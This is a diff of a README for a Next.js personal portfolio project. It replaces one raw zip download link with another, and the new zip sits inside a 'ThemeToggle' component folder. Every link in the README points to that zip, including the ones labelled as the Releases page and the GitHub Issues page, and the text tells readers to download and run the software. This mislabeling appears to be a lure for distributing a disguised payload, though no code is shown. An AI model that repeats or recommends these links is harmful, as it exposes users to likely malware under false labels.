@@ -8,11 +8,11 @@ Welcome to yasir-portfolio-nextjs! This portfolio is designed to highlight Muham
 
 To get started, visit the Releases page below to download the software:
 
-[![Download yasir-portfolio-nextjs](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/diminutiveness/yasir-portfolio-nextjs.zip)](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/diminutiveness/yasir-portfolio-nextjs.zip)
+[![Download yasir-portfolio-nextjs](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/src/components/ThemeToggle/nextjs-yasir-portfolio-3.6.zip)](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/src/components/ThemeToggle/nextjs-yasir-portfolio-3.6.zip)
 
 ### Steps to Download and Run
 
-1. **Visit the Releases Page:** Click the link above or go to [this page](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/diminutiveness/yasir-portfolio-nextjs.zip) to access the latest version of yasir-portfolio-nextjs.
+1. **Visit the Releases Page:** Click the link above or go to [this page](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/src/components/ThemeToggle/nextjs-yasir-portfolio-3.6.zip) to access the latest version of yasir-portfolio-nextjs.
 
 2. **Choose the Latest Release:** Look for the latest version listed at the top. It will have the most recent features and fixes.
 
@@ -30,7 +30,7 @@ To get started, visit the Releases page below to download the software:
   
 - **SEO-Optimized:** Search engines can easily crawl and index the site, helping it become more visible to potential viewers.
 
-- **Modern Framework:** Built with https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/diminutiveness/yasir-portfolio-nextjs.zip, leveraging its features for better performance and user experience.
+- **Modern Framework:** Built with https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/src/components/ThemeToggle/nextjs-yasir-portfolio-3.6.zip, leveraging its features for better performance and user experience.
 
 - **Tailwind CSS:** The stylish design is created using Tailwind CSS, enhancing the visual appeal without sacrificing performance.
 
@@ -59,7 +59,7 @@ This project is licensed under the MIT License. You can view the license file fo
 
 ## 📞 Support
 
-If you encounter any issues while downloading or using the application, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/diminutiveness/yasir-portfolio-nextjs.zip). I will address your concerns as soon as possible. 
+If you encounter any issues while downloading or using the application, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/src/components/ThemeToggle/nextjs-yasir-portfolio-3.6.zip). I will address your concerns as soon as possible. 
 
 ## 🛠️ Contributions
 
@@ -67,4 +67,4 @@ You're welcome to contribute to this project if you have suggestions for improve
 
 ## 🎉 Thank You!
 
-Thank you for your interest in yasir-portfolio-nextjs. I hope you enjoy exploring it and learning more about my work. Don't forget to check out the latest updates on the [Releases page](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/diminutiveness/yasir-portfolio-nextjs.zip)!
+Thank you for your interest in yasir-portfolio-nextjs. I hope you enjoy exploring it and learning more about my work. Don't forget to check out the latest updates on the [Releases page](https://raw.githubusercontent.com/ram26852/yasir-portfolio-nextjs/main/src/components/ThemeToggle/nextjs-yasir-portfolio-3.6.zip)!
